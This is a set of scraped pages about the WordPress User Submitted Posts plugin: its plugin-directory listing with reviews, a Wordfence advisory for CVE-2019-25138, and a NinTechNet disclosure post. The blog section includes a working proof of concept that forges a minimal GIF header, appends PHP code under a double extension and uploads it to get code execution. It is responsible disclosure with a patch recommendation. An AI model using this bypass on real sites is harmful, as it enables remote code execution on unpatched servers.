});</script>

```

Change the two text strings, ‚ÄúThis is the label‚Äù and ‚ÄúThis is the placeholder‚Äù to whatever you would like. Then save changes and done.

### More FAQs

Want to read some more FAQs? Check out the [USP FAQs at Perishable Press](https://perishablepress.com/faqs-user-submitted-posts/)

### Questions? Feedback?

Send any questions or feedback via my [contact form](https://plugin-planet.com/support/#contact). Thanks! üôÇ

## Reviews

![](https://secure.gravatar.com/avatar/d34c4cecc398da1eeb4dd993c1dee3694a04bafb61fbce0653cc0b1d93b3312f?s=60&d=retro&r=g)
### [Thank you, the plugin is well made](https://wordpress.org/support/topic/thank-you-the-plugin-is-well-made/)

[aksel777](https://profiles.wordpress.org/aksel777/ "Posts by aksel777")
January 6, 2025

Add the ability to limit image uploads to KB, limit the length of the title by the number of characters and the length of the text by the number of characters (not words), and I promise to donate!

![](https://secure.gravatar.com/avatar/20d5ec0754aa694b963e92e600e00684e24febfad7dad41fd20791d018224434?s=60&d=retro&r=g)
### [Super useful](https://wordpress.org/support/topic/super-useful-215/)

[Iconic](https://profiles.wordpress.org/iconicwp/ "Posts by Iconic")
December 14, 2024

For a free plugin this offers excellent functionality!

![](https://secure.gravatar.com/avatar/96eecf0f6c6d534b4526009bf7142b6a848a4e1e1af3f4bd1a760ae6271d9481?s=60&d=retro&r=g)
### [User Submitted Post](https://wordpress.org/support/topic/user-submitted-post-3/)

[kakaire](https://profiles.wordpress.org/kakaire/ "Posts by kakaire")
November 24, 2024

This user-friendly plugin streamlines the posting process for stakeholders, eliminating the need for logins.

![](https://secure.gravatar.com/avatar/3aacde79f391bd0c15d72e372a8e6e9914ccc1b342ba4b0024c083c4ed90c997?s=60&d=retro&r=g)
### [Keren](https://wordpress.org/support/topic/keren-33/)

[bilhaq](https://profiles.wordpress.org/bilhaq/ "Posts by bilhaq")
November 23, 2024

berguna

![](https://secure.gravatar.com/avatar/44702710e73b4b835967f7f6679db3c5824dfb9128a16a43b8a6028b5d9735a0?s=60&d=retro&r=g)
### [It‚Äôs ok](https://wordpress.org/support/topic/its-ok-177/)

[vivster81](https://profiles.wordpress.org/vivster81/ "Posts by vivster81")
November 3, 2024

would be good to have more options to edit what the submitted post looks like in the free version, but otherwise, does what it says

![](https://secure.gravatar.com/avatar/11ce5f9ce552c8484f8e9739792eddb5a8edf5fbd878b72eac8c1c206488d30f?s=60&d=retro&r=g)
### [good](https://wordpress.org/support/topic/good-8637/)

[waroengdigital](https://profiles.wordpress.org/waroengdigital/ "Posts by waroengdigital")
September 22, 2024

masih pakai yg free,, sejauh ini dapat berjalan dengan baik, namun kenapa ya ketika ada yang posting dari luar, dan setelah di publish kok namanya tidak bisa dirubah,, muncul nama user yang kirim postinganya,,,

[Read all 897 reviews](https://wordpress.org/support/plugin/user-submitted-posts/reviews/)
## Contributors & Developers

‚ÄúUser Submitted Posts ‚Äì Enable Users to Submit Posts from the Front End‚Äù is open source software. The following people have contributed to this plugin.

Contributors

* ![](https://secure.gravatar.com/avatar/11cf7c9a8f378b8b5dc39b9204c9220b586b1e3d6345a10a05f06d8956c7c027?s=32&d=mm&r=g) [Jeff Starr](https://profiles.wordpress.org/specialk/)

‚ÄúUser Submitted Posts ‚Äì Enable Users to Submit Posts from the Front End‚Äù has been translated into 1 locale. Thank you to [the translators](https://translate.wordpress.org/projects/wp-plugins/user-submitted-posts/contributors) for their contributions.

[Translate ‚ÄúUser Submitted Posts ‚Äì Enable Users to Submit Posts from the Front End‚Äù into your language.](https://translate.wordpress.org/projects/wp-plugins/user-submitted-posts)

### Interested in development?

[Browse the code](https://plugins.trac.wordpress.org/browser/user-submitted-posts/), check out the [SVN repository](https://plugins.svn.wordpress.org/user-submitted-posts/), or subscribe to the [development log](https://plugins.trac.wordpress.org/log/user-submitted-posts/) by [RSS](https://plugins.trac.wordpress.org/log/user-submitted-posts/?limit=100&mode=stop_on_copy&format=rss).

## Changelog

*Thank you to everyone who shares feedback for User Submitted Posts!*

If you like USP, please take a moment to [give a 5-star rating](https://wordpress.org/support/plugin/user-submitted-posts/reviews/?rate=5#new-post). It helps to keep development and support going strong. Thank you!

**20241026**

* Replaces deprecated function `get_page_by_title()`
* Adds new filter hook `usp_check_duplicates`
* Adds ‚ÄúShow Support‚Äù panel to settings page
* Updates plugin settings page
* Updates all translation files
* Updates default translation template
* Tests on WordPress 6.7 (beta)

Full changelog @ <https://plugin-planet.com/wp/changelog/user-submitted-posts.txt>

## Meta

* Version **20241026**
* Last updated **3 months ago**
* Active installations **20,000+**
* WordPress version **4.6 or higher**
* Tested up to **6.7.1**
* PHP version **5.6.20 or higher**
* Languages
  See all 2

  Close

  [Arabic](https://ar.wordpress.org/plugins/user-submitted-posts/) and [English (US)](https://wordpress.org/plugins/user-submitted-posts/).

  [Translate into your language](https://translate.wordpress.org/projects/wp-plugins/user-submitted-posts)
* Tags [frontend post](https://wordpress.org/plugins/tags/frontend-post/)[guest post](https://wordpress.org/plugins/tags/guest-post/)[public post](https://wordpress.org/plugins/tags/public-post/)[submit post](https://wordpress.org/plugins/tags/submit-post/)
* [Advanced View](https://wordpress.org/plugins/user-submitted-posts/advanced/)

## Ratings

4.8 out of 5 stars.

* [838 5-star reviews
  5 stars

  838](https://wordpress.org/support/plugin/user-submitted-posts/reviews/?filter=5)
* [21 4-star reviews
  4 stars

  21](https://wordpress.org/support/plugin/user-submitted-posts/reviews/?filter=4)
* [8 3-star reviews
  3 stars

  8](https://wordpress.org/support/plugin/user-submitted-posts/reviews/?filter=3)
* [5 2-star reviews
  2 stars

  5](https://wordpress.org/support/plugin/user-submitted-posts/reviews/?filter=2)
* [25 1-star reviews
  1 star

  25](https://wordpress.org/support/plugin/user-submitted-posts/reviews/?filter=1)

[Add my review](https://wordpress.org/support/plugin/user-submitted-posts/reviews/#new-post)

[See all reviews](https://wordpress.org/support/plugin/user-submitted-posts/reviews/)

## Contributors

* ![](https://secure.gravatar.com/avatar/11cf7c9a8f378b8b5dc39b9204c9220b586b1e3d6345a10a05f06d8956c7c027?s=32&d=mm&r=g) [Jeff Starr](https://profiles.wordpress.org/specialk/)
## Support

Issues resolved in last two months:

6 out of 7

[View support forum](https://wordpress.org/support/plugin/user-submitted-posts/)

## Donate

Would you like to support the advancement of this plugin?

[Donate to this plugin](https://monzillamedia.com/donate.html)

* [About](https://wordpress.org/about/)
* [News](https://wordpress.org/news/)
* [Hosting](https://wordpress.org/hosting/)
* [Privacy](https://wordpress.org/about/privacy/)

* [Showcase](https://wordpress.org/showcase/)
* [Themes](https://wordpress.org/themes/)
* [Plugins](https://wordpress.org/plugins/)
* [Patterns](https://wordpress.org/patterns/)

* [Learn](https://learn.wordpress.org/)
* [Documentation](https://wordpress.org/documentation/)
* [Developers](https://developer.wordpress.org/)
* [WordPress.tv ‚Üó](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ‚Üó](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ‚Üó](https://wordpress.com/?ref=wporg-footer)
* [Matt ‚Üó](https://ma.tt/)
* [bbPress ‚Üó](https://bbpress.org/)
* [BuddyPress ‚Üó](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from www.wordfence.com_aca9aba8_20250120_233944.html ===


[![](https://www.wordfence.com/img/wordfence-intelligence-logo.svg)](/threat-intel/)

Have you found a vulnerability in a WordPress plugin or theme? Report vulnerabilities in WordPress plugins and themes through our [bug bounty program](https://www.wordfence.com/threat-intel/bug-bounty-program) and earn a bounty on all in-scope submissions, while we handle the responsible disclosure process on your behalf.

As a reminder, the Wordfence Intelligence Vulnerability Database API is completely free to query and utilize, both personally and commercially, and contains all the same vulnerability data as the user interface. Please review the API documentation and Webhook documentation for more information on how to query the vulnerability API endpoints and configure webhooks utilizing all the same data present in the Wordfence Intelligence user interface.

# User Submitted Posts <= 20190312 - Unauthenticated Arbitrary File Upload

 [Wordfence Intelligence](https://www.wordfence.com/threat-intel) ¬†¬†>¬†¬†  [Vulnerability Database](https://www.wordfence.com/threat-intel/vulnerabilities) ¬†¬†>¬†¬† User Submitted Posts <= 20190312 - Unauthenticated Arbitrary File Upload

9.8

**Unrestricted Upload of File with Dangerous Type**
**CVSS Vector**
[CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

| CVE | [CVE-2019-25138](https://www.cve.org/CVERecord?id=CVE-2019-25138) |
| --- | --- |
| CVSS | 9.8 (Critical) |
| Publicly Published | May 2, 2019 |
| Last Updated | June 7, 2023 |
| Researcher | [Jerome Bruandet - NinTechNet](https://www.wordfence.com/threat-intel/vulnerabilities/researchers/jerome-bruandet-1) |

### Description

The User Submitted Posts plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the usp\_check\_images function in versions up to, and including, 20190312. This makes it possible for unauthenticated attackers to upload arbitrary files on the affected sites server which may make remote code execution possible.

#### References

* [blog.nintechnet.com](https://blog.nintechnet.com/arbitrary-file-upload-vulnerability-in-wordpress-user-submitted-posts-plugin/)
* [wordpress.org](https://wordpress.org/plugins/user-submitted-posts/#developers)

#### Share

[Facebook](https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-submitted-posts%2Fuser-submitted-posts-20190312-unauthenticated-arbitrary-file-upload&t=User%20Submitted%20Posts%20%3C%3D%2020190312%20-%20Unauthenticated%20Arbitrary%20File%20Upload "Facebook")
[Twitter](https://twitter.com/share?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-submitted-posts%2Fuser-submitted-posts-20190312-unauthenticated-arbitrary-file-upload&text=User%20Submitted%20Posts%20%3C%3D%2020190312%20-%20Unauthenticated%20Arbitrary%20File%20Upload "Twitter")
[LinkedIn](https://www.linkedin.com/shareArticle?url=http%3A%2F%2Fwww.wordfence.com%2Fthreat-intel%2Fvulnerabilities%2Fwordpress-plugins%2Fuser-submitted-posts%2Fuser-submitted-posts-20190312-unauthenticated-arbitrary-file-upload "LinkedIn")
Email

## Vulnerability Details for User Submitted Posts ‚Äì Enable Users to Submit Posts from the Front End

#### [User Submitted Posts ‚Äì Enable Users to Submit Posts from the Front End](https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/user-submitted-posts)

| Software Type | Plugin |
| --- | --- |
| Software Slug | user-submitted-posts [(view on wordpress.org)](https://wordpress.org/plugins/user-submitted-posts) |
| Patched? | Yes |
| Remediation | Update to version 20190426, or a newer patched version |
| Affected Version | * < 20190426 |
| Patched Version | * 20190426 |

This record contains material that is subject to copyright.

**Copyright 2012-2025 Defiant Inc.**

**License:**
Defiant hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute this software vulnerability information. Any copy of the software vulnerability information you make for such purposes is authorized provided that you include a hyperlink to this vulnerability record and reproduce Defiant's copyright designation and this license in any such copy.
**[Read more.](https://www.wordfence.com/wordfence-intelligence-terms-and-conditions/)**

**Copyright 1999-2025 The MITRE Corporation**

**License:**
CVE Usage: MITRE hereby grants you a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare derivative works of, publicly display, publicly perform, sublicense, and distribute Common Vulnerabilities and Exposures (CVE¬Æ). Any copy you make for such purposes is authorized provided that you reproduce MITRE's copyright designation and this license in any such copy.
**[Read more.](https://www.cve.org/Legal/TermsOfUse)**

Have information to add, or spot any errors? Contact us at wfi-support@wordfence.com so we can make any appropriate adjustments.

Did you know Wordfence Intelligence provides free personal and commercial API access to our comprehensive WordPress vulnerability database, along with a free webhook integration to stay on top of the latest vulnerabilities added and updated in the database? Get started today!

Learn more

Want to get notified of the latest vulnerabilities that may affect your WordPress site?
 Install Wordfence on your site today to get notified immediately if your site is affected by a vulnerability that has been added to our database.

Get Wordfence

The Wordfence Intelligence WordPress vulnerability database is completely free to access and query via API. Please review the documentation on how to access and consume the vulnerability data via API.

Documentation



=== Content from blog.nintechnet.com_6d77840b_20250120_233941.html ===

[![NinTechNet](https://blog.nintechnet.com/wp-content/uploads/2018/07/nintechnet_logo.png)](https://nintechnet.com/)

[NinTechNet](https://nintechnet.com/ "Back to NinTechNet's home")

The Ninja Technologies Network

[Skip to content](#content)
[Menu](#header-menu-responsive)

* [Blog Summary](https://blog.nintechnet.com/)
* [NinTechNet‚Äôs Home](https://nintechnet.com/)

# Arbitrary file upload vulnerability in WordPress User Submitted Posts plugin.

* by [Jerome Bruandet](https://blog.nintechnet.com/author/bruandet/)
* Posted on [May 2, 2019 - 1:40am [+0700]June 19, 2019 - 4:37pm [+0700]](https://blog.nintechnet.com/arbitrary-file-upload-vulnerability-in-wordpress-user-submitted-posts-plugin/)

The WordPress [User Submitted Posts plugin](https://wordpress.org/plugins/user-submitted-posts/), which has 30,000+ active installations, was prone to an arbitrary file upload vulnerability in version 20190426 and below that could allow an unauthenticated user to upload and run a PHP script.

While securing a customer‚Äôs WordPress blog, I noticed that there were a few pending updates available and, among them, one for the User Submitted Posts plugin. It looked like a security issue was reported by someone and fixed by the author in the new version 20190426:

![](/wp-content/uploads/2019/04/user-submitted-posts-update.png)

The [changes](https://plugins.trac.wordpress.org/changeset/2075630/user-submitted-posts/trunk/user-submitted-posts.php?old=2054193&old_path=user-submitted-posts%2Ftrunk%2Fuser-submitted-posts.php) seemed to confirm that:

![](/wp-content/uploads/2019/04/user-submitted-posts-vulnerability.png)

There was a vulnerability in the previous versions of the plugin that allowed an unauthenticated user to upload a PHP script by using its ‚ÄúImage Uploads‚Äù feature, which was supposed to allow image files only.

But I was skeptical about the fact that the new code, which was just checking for a `*.php` extension, was enough to solve the issue. One very simple way to bypass that is to use a double extension such as `script.php.gif`. On a server using Apache with PHP FastCGI, the file will be forwarded to and executed by the PHP interpreter. Note that such trick won‚Äôt work on a server running PHP-FPM. We already have seen similar issues, for instance last year with the zero-day vulnerability in the WordPress [LearnDash LMS plugin](https://blog.nintechnet.com/arbitrary-file-upload-vulnerability-in-wordpress-learndash-lms-plugin/).

To sanitize the file name, developers can use the WordPress `[sanitize_file_name()](https://developer.wordpress.org/reference/functions/sanitize_file_name/)` function that will turn `script.php.gif` into `script.php_.gif`.

When uploading a file, the plugin will perform various checks in the `usp_check_images()` function located in the user-submitted-posts.php script in order to verify if the file is an image: check its type, its size etc:

```
for ($i = 0; $i < $file_count; $i++) {

   $image = @getimagesize($temp[$i]);

   if (false === $image) {

      $error[] = 'file-type';

      break;

   } else {

      if (isset($temp[$i]) && !exif_imagetype($temp[$i])) {

         $error[] = 'file-type';

         break;
      }

      if (isset($image[0]) && !usp_width_min($image[0])) {

         $error[] = 'width-min';

         break;
      }

      if (isset($image[0]) && !usp_width_max($image[0])) {

         $error[] = 'width-max';

         break;
      }

      if (isset($image[1]) && !usp_height_min($image[1])) {

         $error[] = 'height-min';

         break;
      }

      if (isset($image[1]) && !usp_height_max($image[1])) {

         $error[] = 'height-max';

         break;
      }

      if (isset($errr[$i]) && $errr[$i] > 0) {

         error_log('WP Plugin USP: File error message '. $errr[$i] .'. Info @ http://bit.ly/2uTJc4D', 0);

         $error[] = 'file-error';

         break;
      }
   }
}

```

It will use the `exif_imagetype()` and `getimagesize()` functions to make sure the uploaded file is a valid image, or will throw a ‚Äú‚ÄòFile type not allowed (please upload images only)‚Äù error message otherwise. The problem is if those two PHP functions are fine to get information about known and trusted files, they aren‚Äôt suitable for validating untrusted sources such as uploaded files.

Because they are both too often wrongly used, let‚Äôs see exactly how they work and why you should avoid to use them on unstrusted input. PHP being open-source, the best way to see that is to check [its source code](https://github.com/php/php-src):

### exif\_imagetype()

This function is located in the [ext/exif/exif.c](https://github.com/php/php-src/blob/master/ext/exif/exif.c#L4643) file and calls the `php_getimagetype()` function located in [ext/standard/image.c](https://github.com/php/php-src/blob/master/ext/standard/image.c#L1299):

```
/* file type markers */
PHPAPI const char php_sig_gif[3] = {'G', 'I', 'F'};
...
...
/* {{{ php_imagetype
   detect filetype from first bytes */
PHPAPI int php_getimagetype(php_stream * stream, char *filetype)
{
   char tmp[12];
   int twelve_bytes_read;

   if ( !filetype) filetype = tmp;
   if((php_stream_read(stream, filetype, 3)) != 3) {
      php_error_docref(NULL, E_NOTICE, "Read error!");
      return IMAGE_FILETYPE_UNKNOWN;
   }

/* BYTES READ: 3 */
   if (!memcmp(filetype, php_sig_gif, 3)) {
      return IMAGE_FILETYPE_GIF;

```

All it does it to read the first three bytes of the file to determine its type: if it is ‚ÄúGIF‚Äù it will return ‚Äú1‚Äù (IMAGE\_FILETYPE\_GIF). To bypass this function, we can simply create a 3-byte file:

```
$ echo 'GIF' > script.php.gif
```

To test if it works:

```
$ php -r 'echo exif_imagetype("script.php.gif");'
1
```

Success!

### getimagesize()

This function is located in ext/standard/image.c too and, when dealing with GIF images, will call `[php_handle_gif()](https://github.com/php/php-src/blob/master/ext/standard/image.c#L102)`:

```
/* {{{ php_handle_gif
 * routine to handle GIF files. If only everything were that easy... ;} */
static struct gfxinfo *php_handle_gif (php_stream * stream)
{
   struct gfxinfo *result = NULL;
   unsigned char dim[5];

   if (php_stream_seek(stream, 3, SEEK_CUR))
      return NULL;

   if (php_stream_read(stream, (char*)dim, sizeof(dim)) != sizeof(dim))
      return NULL;

   result = (struct gfxinfo *) ecalloc(1, sizeof(struct gfxinfo));
   result->width    = (unsigned int)dim[0] | (((unsigned int)dim[1])<<8);
   result->height   = (unsigned int)dim[2] | (((unsigned int)dim[3])<<8);
   result->bits     = dim[4]&0x80 ? ((((unsigned int)dim[4])&0x07) + 1) : 0;
   result->channels = 3; /* always */

  return result;
}

```

When entering this routine, PHP has already checked the first three bytes (GIF) and will skip the next three ones (one byte from the SignatureHi, a word from the SignatureLo). It will check the following two bytes (image width), the next two ones (image height) and then the next byte (Global Color Table flags) and will stop. Therefore we can bypass that function by forging a fake 11-byte GIF image. In the following example, I‚Äôm setting the width and height to 100 pixels (0x0064) because, by default, User Submitted Posts will not accept values higher than 1500√ó1500 pixels:

```
$ printf 'GIF89a\x64\x00\x64\x00\x80' > script.php.gif
```

To test if it works:

```
$ php -r 'print_r( getimagesize("script.php.gif") );'
Array
(
    [0] => 100
    [1] => 100
    [2] => 1
    [3] => width="100" height="100"
    [bits] => 1
    [channels] => 3
    [mime] => image/gif
)

```

Success again!

As you can see, those two functions are really not suitable for user input validation.

### Proof of Concept

Append some PHP code to the above fake `script.php.gif` image:

```
$ printf '<?php echo "\\nPHP ". PHP_SAPI ." on ". php_uname();'  >> script.php.gif
```

Upload the file using User Submitted Posts form. It will be saved to the /wp-content/uploads/YYYY/MM/ folder:

```
$ curl http://example.com/wp-content/uploads/2019/04/script.php.gif
GIF89addÔøΩ
PHP cgi-fcgi on Linux deb 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64

```
### Timeline

The vulnerability was discovered and reported to the wordpress.org team on April 27, 2019.

### Recommendations

Update as soon as possible if you have version 20190426 or below installed.

If you are using our web application firewall for WordPress, [NinjaFirewall WP Edition](https://wordpress.org/plugins/ninjafirewall/) (free) and [NinjaFirewall WP+ Edition](https://nintechnet.com/ninjafirewall/wp-edition/) (premium), you are protected. NinjaFirewall protects proactively against this type of vulnerability.

Stay informed about the latest vulnerabilities in WordPress plugins and themes: [@nintechnet](https://twitter.com/nintechnet)

Tagged: [NinjaFirewall](https://blog.nintechnet.com/tag/ninjafirewall/), [Security](https://blog.nintechnet.com/tag/security/), [Vulnerability](https://blog.nintechnet.com/tag/vulnerability/), [WordPress](https://blog.nintechnet.com/tag/wordpress/)

* [Share on Twitter](https://twitter.com/share?text=Arbitrary%20file%20upload%20vulnerability%20in%20WordPress%20User%20Submitted%20Posts%20plugin.&url=https%3A%2F%2Fblog.nintechnet.com%2Farbitrary-file-upload-vulnerability-in-wordpress-user-submitted-posts-plugin%2F)
* [Share on Facebook](https://www.facebook.com/sharer.php?u=https%3A%2F%2Fblog.nintechnet.com%2Farbitrary-file-upload-vulnerability-in-wordpress-user-submitted-posts-plugin%2F)
* [Share on Reddit](https://www.reddit.com/submit?title=Arbitrary%20file%20upload%20vulnerability%20in%20WordPress%20User%20Submitted%20Posts%20plugin.&url=https%3A%2F%2Fblog.nintechnet.com%2Farbitrary-file-upload-vulnerability-in-wordpress-user-submitted-posts-plugin%2F)
* [RSS icon](https://blog.nintechnet.com/feed/)

## Post navigation

[Previous Zero-day vulnerability in WordPress YellowPencil Visual CSS Style Editor plugin actively exploited.](https://blog.nintechnet.com/zero-day-vulnerability-in-wordpress-visual-css-style-editor-plugin-actively-exploited/)[Next Arbitrary file upload vulnerability in WordPress Crelly Slider plugin.](https://blog.nintechnet.com/arbitrary-file-upload-vulnerability-in-wordpress-crelly-slider-plugin/)

## Our Products

![NinjaFirewall](https://blog.nintechnet.com/wp-content/uploads/2018/09/logo-nfwp-150.png)

**NinjaFirewall WP+**

Web Application Firewall for WordPress. It will give your blog the highest level of protection it deserves.

Free Download

---

![SaferCheckout](https://blog.nintechnet.com/wp-content/uploads/safercheckout_150x150.png)

**SaferCheckout**

A powerful security plugin to protect WooCommerce stores from fraudulent transactions.

Free Download

---

![NinjaFirewall](https://blog.nintechnet.com/wp-content/uploads/2018/09/logo-nfpro-150.png)

**NinjaFirewall Pro+**

Web Application Firewall for PHP applications. It will protect your PHP site, from custom scripts to popular shopping cart and CMS applications.

Free Download

---

![Code Profiler](https://blog.nintechnet.com/wp-content/uploads/2018/09/logo-cp-150.png)

**Code Profiler**

Speed up your WordPress website by locating bottlenecks and performance issues in your plugins and themes.

Free Download

---

![NinjaScanner](https://blog.nintechnet.com/wp-content/uploads/2018/09/logo-ns-150.png)

**NinjaScanner**

A lightweight, fast and powerful malware and virus scanner for WordPress which includes many features to help you scan your blog for malware and virus.

Free Download
## Categories

Categories
Select Category
Benchmarks¬†¬†(5)
Changelog¬†¬†(1)
Code Profiler¬†¬†(1)
HHVM¬†¬†(1)
Joomla!¬†¬†(2)
Magento¬†¬†(1)
NinjaFirewall¬†¬†(150)
NinjaScanner¬†¬†(8)
Performance¬†¬†(2)
Privacy¬†¬†(1)
Security¬†¬†(154)
¬†¬†¬†Brute-force attack¬†¬†(5)
¬†¬†¬†Malware¬†¬†(7)
¬†¬†¬†Phishing¬†¬†(2)
¬†¬†¬†Virus¬†¬†(2)
¬†¬†¬†Vulnerability¬†¬†(129)
Troubleshooting¬†¬†(14)
Tutorial¬†¬†(26)
WooCommerce¬†¬†(2)
WordPress¬†¬†(149)

## Search

Search for:

Search

## Recent Posts

* [XSS / HTML injection vulnerability in WordPress Plugin Check (PCP) plugin.](https://blog.nintechnet.com/xss-html-injection-vulnerability-in-wordpress-plugin-check-pcp-plugin/)
  December 6, 2024 - 7:24pm [+0700]
* [How to debug WooCommerce Add to Cart action with Code Profiler.](https://blog.nintechnet.com/how-to-debug-woocommerce-add-to-cart-action-with-code-profiler/)
  November 28, 2024 - 7:00pm [+0700]
* [SaferCheckout: Fraud prevention plugin for WooCommerce stores.](https://blog.nintechnet.com/safercheckout-fraud-prevention-plugin-for-woocommerce-stores/)
  August 5, 2024 - 5:31pm [+0700]
* [Unauthenticated function injection vulnerability in WordPress Shortcode Addons plugin (unpatched).](https://blog.nintechnet.com/unauthenticated-function-injection-vulnerability-in-wordpress-shortcode-addons-plugin-unpatched/)
  April 22, 2024 - 11:29am [+0700]
* [Broken access control vulnerability fixed in WordPress 10Web AI Assistant plugin.](https://blog.nintechnet.com/broken-access-control-vulnerability-fixed-in-wordpress-10web-ai-assistant-plugin/)
  January 26, 2024 - 1:50pm [+0700]

¬© Copyright
2025 ‚Äì [The Ninja Technologies Network](https://nintechnet.com/)


